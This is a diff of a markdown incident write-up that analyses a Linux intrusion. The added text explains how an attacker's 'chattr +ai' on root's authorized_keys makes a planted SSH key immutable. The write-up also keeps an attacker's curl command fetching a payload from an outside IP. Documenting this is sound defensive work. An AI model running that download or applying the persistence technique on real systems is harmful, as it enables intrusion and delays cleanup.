@@ -648,7 +648,7 @@ _02/02_, actor adds their SSH public key to root's authorized_keys and makes the
    - SSH key login may not generate password login attempts
    - `chattr +ai` prevents even root from editing/deleting the key without first removing the immutable attribute
    - Makes cleanup harder for defenders
-
+     
 <br>
 
 <img width="1670" height="1059" alt="image" src="https://github.com/user-attachments/assets/d1937763-4c15-40fd-b980-c44666213c08" />
@@ -966,6 +966,43 @@ virusttal dinpasiuneDOTcom
 among communicating files: retea & diicot
 
 <img width="1264" height="644" alt="image" src="https://github.com/user-attachments/assets/a1ddd61f-0cfc-4b63-86ef-744a87475176" />
+
+ For a skilled Linux admin with root access, it’s trivial.
+For an average responder who doesn’t notice it, it can be confusing and time‑wasting.
+
+What chattr +ai Actually Does
+
+They ran:
+
+chattr +ai ~/.ssh/authorized_keys
+
+
+That sets two extended attributes:
+
++a → append‑only
+
++i → immutable
+
+The important one is immutable (+i).
+
+When a file is immutable:
+
+❌ Cannot be deleted
+
+❌ Cannot be modified
+
+❌ Cannot be renamed
+
+❌ Cannot be overwritten
+
+❌ Even root cannot edit it
+
+❌ chmod won’t work
+
+❌ rm won’t work
+
+Until you remove the flag.
+It can delay remediation and leave the system reinfected.
 
 
 curl http://23.160.56.194/r.txt -o sdf3fslsdf15
